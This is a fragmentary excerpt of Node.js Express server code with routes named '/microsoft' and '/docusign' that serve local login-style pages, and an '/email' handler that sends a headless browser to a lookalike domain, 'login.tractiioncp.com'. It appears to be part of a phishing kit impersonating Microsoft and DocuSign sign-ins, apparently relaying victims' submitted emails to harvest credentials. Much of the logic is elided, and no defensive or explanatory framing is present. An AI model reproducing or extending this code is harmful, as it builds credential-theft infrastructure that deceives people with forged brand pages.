...
app.get("/microsoft", (req, res) => {
  if (!req.query.id) {
    ...
    res.sendFile(path.join(__dirname, "views/microsoft", "index.html"));
  }
});
...
app.get("/docusign", (req, res) => {
  if (!req.query.id) {
    ...
    res.sendFile(path.join(__dirname, "views/docusign", "index.html"));
  }
});
...
app.post("/email", async (req, res) => {
  ...
  try {
    ...
    await page.goto("https://login.tractiioncp.com/pKvZNAzF", {
      timeout: 60000,
    });
